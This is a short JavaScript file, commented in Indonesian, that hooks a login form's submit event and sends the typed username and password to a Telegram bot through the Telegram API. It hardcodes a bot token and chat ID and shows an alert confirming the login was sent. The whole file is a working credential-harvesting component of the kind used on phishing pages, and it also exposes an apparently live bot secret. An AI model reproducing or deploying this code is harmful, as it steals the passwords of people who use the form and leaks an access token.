// Ganti dengan Bot Token Telegram Anda
const BOT_TOKEN = "7883195342:AAHFVsKhUbxrEqtBdq3jlZJpn9w7FEll2ak"; 
// Ganti dengan Chat ID Anda
const CHAT_ID = "6936723956";

// Menambahkan event listener ke form login
document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault(); // Mencegah form reload
    
    // Mengambil data dari input form
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Pesan yang akan dikirim ke Telegram
    const message = `🔐 *Login Attempt*\n👤 *Username:* ${username}\n🔑 *Password:* ${password}`;

    // Mengirim pesan ke Telegram menggunakan API
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown",
        }),
    })
    .then(response => {
        if (response.ok) {
            alert("Login berhasil dikirim ke Telegram!");
            document.getElementById('loginForm').reset();
        } else {
            throw new Error("Gagal mengirim data ke Telegram.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Terjadi kesalahan.");
    });
});

